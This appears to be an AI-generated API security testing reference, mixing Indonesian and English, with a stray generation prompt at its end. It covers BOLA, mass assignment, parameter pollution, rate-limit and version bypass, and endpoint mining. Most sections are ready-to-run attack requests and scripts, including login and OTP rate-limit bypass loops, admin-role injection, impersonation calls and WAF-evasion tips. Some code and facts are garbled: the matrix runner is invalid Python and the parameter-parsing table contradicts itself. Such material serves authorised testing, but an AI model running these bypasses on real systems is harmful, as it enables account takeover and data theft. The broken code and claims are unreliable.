# api-sec — api

# API Security: Testing Technique Reference

## Table of Contents
1. BOLA (Broken Object Level Authorization)
2. Mass Assignment & Field Discovery
3. HTTP Parameter Pollution (HPP)
4. Rate Limit Bypass
5. API Versioning Bypass
6. Undocumented Endpoint Mining from JS
7. Authorization Matrix Testing

---

## 1. BOLA (Broken Object Level Authorization)

OWASP API Top 10 #1. core: the server does not validate object ownership, only token authenticity.

### 1.1 Pattern Umum

| Pattern | Example | Check |
|---|---|---|
| ID sequential | `/api/v1/invoices/10024` | iterasi id lain |
| UUID | `/api/v1/orders/550e8400-e29b...` | leak UUID via response API lain |
| Nested resource | `/api/v1/users/88/cards` | ganti user id |
| Body-based ID | `PUT /api/v1/profile` + `{"user_id": 88}` | Mass assignment overlap |
| Response-only | GET sukses tapi data pihak lain terbaca | diff response |

### 1.2 Example Request

```http
GET /api/v1/invoices/10024 HTTP/1.1
Host: target.local
Authorization: Bearer $TOKEN_A
```

**What is sent:** user A's token, resource id belonging to user B.
**What appears when vulnerable:** `200 OK` + user B's invoice data.
**Why it fails:** layered authz (middleware checks `invoice.owner == jwt.sub`) → `403` or `404` (404 is more common as anti-enumeration, which complicates mass detection — compare body, not just status).

### 1.3 Snippet Deteksi otomatis (Python + httpx)

```python
import httpx, hmac

def probe(base, ids, tokenA, tokenB):
    s = httpx.Client(headers={"Authorization": f"Bearer {tokenA}"})
    ref = None
    for i in ids:
        r = s.get(f"{base}/invoices/{i}")
        body = r.text
        if ref is not None and hmac.compare_digest(body, ref) is False:
            print(f"[!] {i}: diff vs reference (status {r.status_code})")
        ref = ref or body
```

Principle: **two requests, two accounts**. Identical responses between accounts = safe for that id; different responses between accounts even with same id = different data per user (normal); same response for an id belonging to another account = BOLA.

### 1.4 Variant: replace object reference in full request

```http
POST /api/v1/transactions HTTP/1.1
Content-Type: application/json

{"from_account": "ACC-1001", "to_account": "ACC-9999", "amount": 1, "currency": "IDR"}
```

Change `to_account` to an account you do not own, amount = 1 (small test). If `201 Created`, check whether you can **inspect the transaction status belonging to another account** via `GET /transactions/{id}` — a write-then-read BOLA combination.

### 1.5 Jebakan Deteksi
- Endpoint sends `owner_id` in the response but GET remains only for resources owned by yourself — not BOLA.
- Cache layer (Cloudflare, nginx `proxy_cache`) can cause another user's response to leak (weak cache key = different vuln, cache poisoning/deception).

---

## 2. Mass Assignment & Field Discovery

### 2.1 Field Discovery via OPTIONS

```http
OPTIONS /api/v1/users/me HTTP/1.1
```

With frameworks that expose schema (Laravel/FastAPI/NestJS debug mode):

```
Allow: GET, PUT, PATCH, POST, OPTIONS
```

FastAPI more often leaks via `/openapi.json`, but OPTIONS sometimes leaks middleware behavior.

### 2.2 Field Discovery via OpenAPI/GraphQL Introspection

```bash
curl -s https://target.local/api/v1/openapi.json | jq '.components.schemas.UserUpdate.properties | keys'
```

GraphQL:

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name kind ofType { name } } }
      }
    }
  }
}
```

Tools: **graphqlviz**, **graphw00f** (fingerprint engine, detects Apollo/Graphene/Hasura), **clairvoyance** (brute-force field when introspection is disabled).

### 2.3 Field Discovery from JS bundle

```bash
# ekstrak dari JS bundle
grep -rhoP '"[a-z_]*(is_admin|role|admin|internal|price|balance|verified)[a-z_]*"' \
  $(cat js_files.txt) | sort -u
```

See section **3. Undocumented Endpoint Mining** for how to dump the list of JS files.

### 2.4 Example Attack

Baseline update (aman):
```http
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json

{"name": "baru"}
```

Mass assignment attempt:
```http
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json

{"name": "baru", "role": "admin", "is_staff": true, "tenant_id": "TENANT-ROOT", "email_verified": true, "credit": 999999}
```

**Why it works:** backend performs `User.update(request.body)` without allowlist (common pattern: Rails strong parameters not used, Laravel `$request->all()` + `Model::fill`).
**Why it fails:** `$fillable` / DTO / schema validation (`additionalProperties: false` in FastAPI/NestJS) → `422` **or silently *ignored***. Always diff the response before/after to confirm which fields are accepted.

### 2.5 Shortcut: combine with idempotency key

```http
POST /api/v1/accounts?role=admin HTTP/1.1
```

Query parameters go into `request.input()` in some frameworks → routed to model binding. Test both in the body **and** in the query string.

### 2.6 Nest.js / TypeORM Spesifik

Check the `password` field in the response:
```http
PATCH /api/v1/users/me
{"permissions": {"admin": {"enabled": true}}}
```
TypeORM nested relation patching occurs when `@Expose()`/`@Exclude()` is not strict — nesting an object sometimes *links* to a separate `permissions` table.

---

## 3. HTTP Parameter Pollution (HPP)

### 3.1 Mekanisme per Server/Framework

| Runtime | `?a=1&a=2` → `request.a` | Last/First |
|---|---|---|
| PHP 8.x + Apache 2.4 | `["1","2"]` (array) via `$_GET` tapi `$_GET["a"]` = `"1"` (last? → first? sebenarnya PHP: last for scalar, param override via `getenv`) | complex |
| Express 4/5 (Node) | `req.query.a = "1"` | **first** |
| ASP.NET Core 8 | joins with `,` → `"1,2"` | join |
| ASP.NET Framework (System.Web) | `["1","2"]` | array |
| Rails 7 | `"2"` | last |
| Flask 3 / Werkzeug | `"1"` | first (MultiDict `.get()`) |
| Go net/http | `r.URL.Query().Get()` → `"1"` | first |
| nginx 1.25 `$arg_name` | `"1"` | first |

### 3.2 Example: Authz Bypass via HPP

```http
GET /api/v1/admin/users?role=user&role=all HTTP/1.1
Authorization: Bearer $TOKEN_USER
```

Express middleware reads `role=user` (first) → passes the check `role must == user`. Handler reads via a different library (e.g. `qs` extended: **last** = `all`) → dumps all users.

**What appears when vulnerable:** `200` + list of all users.
**Why it's possible:** two points read parameters with different parsing libraries, or middleware uses `req.query.a`, handler uses `req.rawHeaders` manual parsing.

### 3.3 HPP + Path/router

```http
GET /api/v1/orders?search=*&debug=1&debug=0 HTTP/1.1
```

Some routers (Express Router pattern `/api/:version/orders`) take the version from the URL; if the `version` parameter can be overlapped in the query, the router reads the first QP version while the audit logger reads the second QP → audit log states `debug=0`, actual request `debug=1`.

### 3.4 HPP in Body (JSON)

```http
POST /api/v1/transfer HTTP/1.1
Content-Type: application/json

{"amount": 1, "amount": 1000000}
```

Parser JSON:
- Python `json.loads()` → last key win (`1000000`)
- Go `encoding/json` → last key win
- Node `JSON.parse()` → last key win
- Java Jackson (depends on config, default: **first**)

Exploit: validation layer (Jackson, first=`1` → valid) + processing layer (Node, last=`1000000`). Polyglot architecture = real attack surface.

### 3.5 HPP for Rate Limit

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong&username=admin&password=wrong2
```

SLA rate limiter can read `username` first for cache key, but auth backend reads last → several password combinations are tried in one window.

---

## 4. Rate Limit Bypass

### 4.1 X-Forwarded-For (XFF) Family

```bash
# Baseline: hammer sekali, konfirmasi limit
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} %{header_json}\n" \
    -X POST https://target.local/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"user":"a","pass":"b"}'
done
```

Headers that need to be tested (many load balancers & WAF trust these headers by accident):

| Header | Read by |
|---|---|
| `X-Forwarded-For` | nginx `real_ip` (if `set_real_ip_from` misconfigured), Express `req.ips` (if `trust proxy`), AWS ALB forwarded to backend |
| `X-Real-IP` | nginx custom configuration |
| `X-Originating-IP`, `Client-IP`, `X-Client-IP`, `CF-Connecting-IP` (only applies if app is behind Cloudflare and origin is also CF) | legacy |

**Why it works:** rate limiter key = XFF instead of TCP source IP. Load balancer appends the original XFF (`X-Forwarded-For: <spoofed>, <real_ip>`) — if the limiter uses `split(',')[0]` without validation, spoof still affects the key.
**Why it fails:** origin web server ignores incoming XFF (`set_real_ip_from` restricted to trusted IPs), or limiter uses `binary_remote_addr`.

### 4.2 IPv6 Rotation

Some fingerprinting/limiter give a budget per /64 (one home user = one /64). If limit is per IP, rotate within /64 (one subnet):

```bash
# 1) Config root: WHATWG vs kernel (nginx 1.25 adalah binary, kernel Linux 6.8)
# 2) Iterasi dalam /64
BASE="2001:db8:dead:beef"
for i in $(seq 1 500); do
  ip="${BASE}::$(printf '%x' $i)"
  curl -s -6 --interface "$ip" -o /dev/null \
    -w "%{http_code}\n" \
    -A "Mozilla/5.0" https://target.local/api/v1/otp --data "phone=0812xxxx"
done
```

Alternative: /48 range from tunnel broker (Hurricane Electric) when /64 exhausts its budget — some limiters give a larger budget per /48 aggregate.

### 4.3 Case Variation & Path Mutation

Rate limiter based on **non-normalized route cache key**:

```http
POST /api/v1/auth/login
POST /api/v1/AUTH/LOGIN          # case (nginx case-sensitive, tapi beberapa framework .Net insensitive)
POST /api/v1/auth/login/         # trailing slash
POST /api/v1//auth/login         # double slash
POST /api/v1/./auth/login        # dot segment
POST /api/v1/auth%5flogin        # URL-encoded underscore
POST /api/v1/auth/login?a=1       # cache bust (wildcard Key)
POST /API/V1/AUTH/LOGIN          # asp.net case-insensitive routing → sama route upstream
```

ASP.NET Core: routing is case-insensitive by default (`PascalCase`/lowercase match equal) → a limiter whose key is raw path case-sensitive will see "different" requests, while the backend processes the same route. Rate limit bypass occurs in the **gap between stateless cache key and routing rules**.

### 4.4 Kombinasi: Header Auth + query param

Banyak API key-based limiter memberi N req per token. Trik:
```http
POST /api/v1/search?_=1735689600 HTTP/1.1
X-API-Key: KEY-ABC
```
If the limiter uses `(key, path)` as cache key, `_=timestamp` cache bust → unlimited. Every request must have a different param value.

---

## 5. API Versioning Bypass

### 5.1 Patterns to test

| URL | Hipotesis | Cek |
|---|---|---|
| `/api/v1/...` | v1 = legacy, authz longgar | diff vs v2 |
| `/api/v0/...`, `/api/beta/...` | pre-release path alive | cek status |
| `/api/internal/...`, `/api/admin/...` | not in edge router but live in backend | check via SSRF or direct |
| `/api/v1/../v2/...` | path traversal router | encoded `%2e%2e%2f` |
| `/api/v2%00/...` | null byte truncation in some routers | check 200 vs 400 |

### 5.2 Example Classic Scenario

There is no authz in `/v1` (deprecated but still live):

```http
GET /api/v1/users/88/profile HTTP/1.1
# ← tanpa Authorization header
# → 401

GET /api/v2/users/88/profile HTTP/1.1
# → 401

GET /api/internal/users/88/profile HTTP/1.1
# → 200 OK  ← legacy cluster, sebelumnya siapkan jangkar: internal LB dipublish via SSRF/RCE chain
```

**Why it works:** deprecation in practice = removed from *documentation*, not from the router. Gateway (Kong/Traefik/AWS API Gateway) only has routes for v2, but the backend cluster still serves v1 on a listener that was never turned off. This happens when:
1. Gateway has wildcard `/api/*` → directed to backend that still serves both versions.
2. Load balancer without path filter directly touches service.

**Why it fails:** Gateway rate-limits per path version-specific with 404 default in old version; backend service is indeed reimplementation without v1 handler.

### 5.3 API Gateway → Version Bypass via path rewrite

Traefik/Kong `stripPrefix` configuration can make:
- Request: `GET /api/v1/users` (no auth, gateway only installs auth plugin at `/api/v2/*`)
- Gateway rewrite → backend receives `/v2/users` → still uses modern handler but without authz layer

Check path mapping via `HEAD` / `OPTIONS` response and header `X-Served-By`, `Via`.

---

## 6. Undocumented Endpoint Mining from JS

### 6.1 2024 Reference: SPA (React 19/Vue 3/Next.js 15, Angular 17)

Next.js 15 and Nuxt 3 often leak routes in build manifest:
- `/_next/static/{buildId}/_buildManifest.js` — route map
- `/_nuxt/builds/latest.json` then `/_nuxt/builds/meta/{id}.json`
- Angular: `main.{hash}.js` berisi route config inline (source map kadang aktif)

### 6.2 Pipeline

```bash
# 1. Collect URLs + JS
cat subdomains.txt | hakrawler -depth 3 -plain | sort -u > urls.txt
cat urls.txt | httpx -silent | grep -i "\.js$" | sort -u > js_orig.txt
# atau getJS / waymore (00pxPy/waymore) untuk JS dari wayback machine — sangat sering menangkap versi JS lama, endpoint lama, dan API key yang sudah dihapus dari build terbaru
waymore -i target.local -mode U -oU wayback_urls.txt

# 2. Anti-minify + beautify (opsional, untuk readability)
# prettier — atau gunakan https://beautifier.io/

# 3. Ekstrak endpoint pattern
grep -rhoP '"\/[a-zA-Z0-9_\/-]{2,64}"' $(cat wayback_urls.txt) | sort -u | grep -E "^\"\/(api|v[0-9]|internal)" > api_candidates.txt

# 4. Ekstrak path dengan builder (template literals)
grep -rhoP '`\$\{?baseURL[A-Za-z]*\}?[^`]{0,100}`' .

# 5. Ekstrak secret (hardcoded)
noseyminer / trufflehog fs . --no-verification  # ukur entropy, cek kredensial als
# manual grep:
grep -rhoP "(api[_-]?key|secret|token|password)[\":\s=]+['\"][A-Za-z0-9+/_-]{20,}['\"]" . | sort -u

# 6. Probe-candidate live
cat api_candidates.txt | tr -d '"' | httpx -status-code -silent -title
```

Integration tools: **LinkFinder**, **JSFinder**, **SecretFinder**, **AntiCrawler-killer trick**: JS fetched via `curl` — some JS endpoints **only** load on certain user roles (admin JS chunk separate) → check `chunk-*.js` from webpack manifest:

```bash
# Webpack manifest leak
curl -s https://target.local/main.js | grep -oP '"chunk-[a-f0-9]+"' 
# atau lihat runtime JS: webpack memuat map chunk → baca `__webpack_require__` object literal
```

### 6.3 Example Findings from JS

`chunk-9f3a.js` ekstrak:
```js
{path:"/api/v1/internal/impersonate",method:"POST",bodySchema:{targetUserId:"string"}}
```

Request:
```http
POST /api/v1/internal/impersonate HTTP/1.1
Content-Type: application/json
Authorization: Bearer $TOKEN_REGULER

{"targetUserId": "u_1024"}
```
If `200` + `Set-Cookie` admin token → internal endpoint is not covered by authz at gateway.

### 6.4 Source Map Exposure

```bash
curl -s https://target.local/main.8f3a2.js.map -o main.map
npx source-map-explorer main.map # atau shuji
# source ts berisi comment berisi "TODO fix authz" "deprecated, do not ship"
```

Also check `.env` file leak: `https://target.local/.env`, `main.ts` references.

---

## 7. Authorization Matrix Testing

Systematic testing of all Role × Object × Action combinations. Without a matrix, BOLA in certain roles is missed.

### 7.1 Struktur Matriks

| Role/Token | GET /users/{id} | PUT /users/{id} | GET /admin/audit | POST /users/{id}/refund |
|---|---|---|---|---|
| anonymous | 401 | 401 | 401 | 401 |
| user (self) | 200 | 200 | **403** | **403** |
| user (other) | **200 = BUG** | **200 = BUG** | 403 | **200 = BUG** |
| user (other tenant) | **200 = BUG** | 403 | 403 | 403 |
| customer_support | 200 | **200 = BUG** | 403 | **200 = BUG** |
| admin | 200 | 200 | 200 | 200 |

### 7.2 Snippet: automated matrix runner

```python
import httpx
from itertools import product

ROLES = {"anon": None, "user1": TOKEN_U1, "user2": TOKEN_U2, "support": TOKEN_SUP, "admin": TOKEN_ADM}
# (method, path_template, expected status per access-class)
CASES = [
    ("GET", "/api/v1/users/{oid}"),
    ("PATCH", "/api/v1/users/{oid}"),
    ("GET", "/api/v1/admin/audit"),
    ("POST", "/api/v1/users/{oid}/refund"),
]
CLASSIFIER = {
    # classifier: fungsi (role, path) -> expected class
    # untuk tiap case, tulis expect; kemudian deviasi = temuan
}

s = httpx.Client(timeout=10)
for role, tok in ROLES.items():
    headers = base headers; if tok: headers["Authorization"] = f"Bearer {tok}"
    for meth, path in CASES:
        # substitusi {oid} milik user2 (objek milik partisipan lain)
        url = path.format(oject oid=OID_U2)
        r = s.request(meth, url, headers=headers, json={})
        print(f"{role:10} {meth:7} {url:45} -> {r.status_code} {len(r.content)}B")
```

**Relevant output being sought:**
- Non-403/401 status for combinations that should be rejected
- 403/404 that *changes into* 200 when path is mutated (trailing slash, case, double slash) → indication authz middleware is not working on route alias
- Identical response for user1 vs user2 for user2's object (should be identical too — if different, user2 sees additional data of their own, that's normal; if same, user1 can access user2's data)

### 7.3 Important Variables in Matrix

Dimensions often overlooked:

1. **Tenant / organizational boundary** — rubric separate from role. User may see their tenant's resources, but other tenant resources must be 403/404.
2. **Object state transition** — GET `/orders/{id}` → 200 when status `draft`, must be 403 when status `completed`. Append to matrix.
3. **ID encoding** — internal integer vs public UUID. Classic bug: authz check uses public id from URL but join in SQL uses internal id → typo bypass.
4. **Implicit method dispatch** — several frameworks map `HEAD`, `OPTIONS`, `TRACE` to GET handler without passing through authz middleware (Spring Security pre-2017 release: `@PreAuthorize` on method, sometimes `permitAll OPTIONS` for CORS). Always test non-CRUD verbs:

```http
HEAD /api/v1/admin/users HTTP/1.1
X-HTTP-Method-Override: DELETE
```

Tools for verbs: `arjun` (parameter discovery), `feroxbuster`, `kiterunner` (API endpoint brute-force, wordlist kubernetes-api/swagger).

### 7.4 Audit-an-Gap Pattern

**Permintaan:**
```http
POST /api/v1/items HTTP/1.1
Authorization: Bearer $TOKEN_USER1
{"name": "probe", "id": null}
```
Response:
```json
{"id": "uuid-1234", "tenant": "T1"}
```

Replay **after cross-account test**:
```http
POST /api/v1/items?tenant=T2  # query param overlap (HPP + mass assignment)
```

This combined pattern wins in the field: tenant ID from JWT, but overwrite via query/JSON → mass assignment → tenant bypass.

---

## 8. Operational Pitfalls (why this technique fails in the field)

| Jebakan | Mitigasi |
|---|---|
| **Invalid TTL / session expired mid-scan** — user B's token expires in 15 minutes, scan 40 minutes, `200` that is actually `401` incorrectly classified as "accessible". | Detect 200 vs 401 pattern per-N-request; kill early, re-login, retry; assert actual HTTP 200 baseline before each batch. |
| **WAF / bot detection** — sled 500 BOLA probe requests → IP blocked → remaining false positives. | From outbound IP hash that matches legitimate user fingerprint; respect **`Retry-After`** header; use residential/IPv6 alternative exit (tunnel by IPv6 /64 is even very cheap compared to residential tunnel). |
| **Data staging** — you find BOLA in staging (stg.target.local), not production. Sometimes staging has production data (bug by ops team), so capture real evidence. | Always check `dlq`/prod via subdomain. Identify staging via response header `X-Environment: staging` or dummy data (`John Doe`). |
| **Account lockout** — you trigger 5 account lockouts; SOC sees 5 user complaints → engagement expires. | Check lockout threshold BEFORE mass probe; use 2 additional test accounts as canary; don't hammer `/login`, only test rate-limit on owned connections. |
| **Lead/CANARY as finding** — you forget that the user you found is yourself (other 2nd-level test account of your own). | All object IDs claimed as "belonging to someone else" must be **proven via unique sensitive data** (name, address for example) — not just via different `id`. |
| **JSON key duplication** — you test HPP with JSON duplicate key but Go & Python & Node all last-win → must choose framework mismatch. | Identify client library vs backend parsing layer via error message fingerprinting (`default"". Is not ""...-- pyc / ORM error text diff) before inferring parsing order. |
| **XFF spoof fails because origin is direct-connect** — app is on Docker internal overlay network, XFF never accurate from `internet` → you protest a value that is never read. | Use analysis chain response (route via CDN → origin) — check internal `Traceroute`/internal ALB; if SSRF possible, inject XFF from *inside* (internal proxy by default trusts XFF). |
| **Rate limit is per-subnet, not us being limited** — you think bypass technique fails, when you share /64 with other traffic, your own trick is safe. | Validate baseline: time-to-429 after which request, repeat 2x; if highly variable, there may be internal concurrency (not access rate limit) — analysis before claiming "bypass failed". |
| **Example.com vs API gateway route** — you hear frontend uses `/api/v1/...` but gateway edge has `/v1/...` (strip prefix). Endpoint `/api/internal` you test directly 404, and you conclude "safe", whereas its gateway rewrites `/api/*` → `/*`. | Fetch `robots.txt`, `sitemap.xml`, WADL (`/application.wadl` in Jersey), OpenAPI (`/swagger`, `/docs`, `/redoc`, `/openapi.json`) from root domain. Combine with route tracing (404 diff, `Via` header). |
| **Unstable retesting** — BOLA v1 findings cannot be reproduced the next day, because dev made a silent patch (old CDN edge cache still holds old responses → you catch a false positive). | Buddy, save raw request/response along with timestamp and routing path (`cf-ray`, `X-Served-By`), repeat via a second source (different egress, VPN). |
| **GET request always allowed by the user** — BOLA detection only via POST/PATCH action; you scan GET-only because "safer", whereas write actions are the most problematic. | Ensure the engagement scope includes write actions; if you must be GET-only due to fear of breakage, use a sandbox mirror. |

### Example of Misinterpreted Log

```
[12:00:01] BOLA probe id=10024 status=200 len=532
[12:00:05] BOLA probe id=10025 status=200 len=532
```
Both requests use a user token that is locked-out → the session-validator middleware `return next()` without error, so the fallback handler sends "sample data" with a 532B body. Solution: very canary — check the response for user A's private data before batch scanning.

---

## [reasoning trace]

Write Indonesian technical reference. Just produce it.
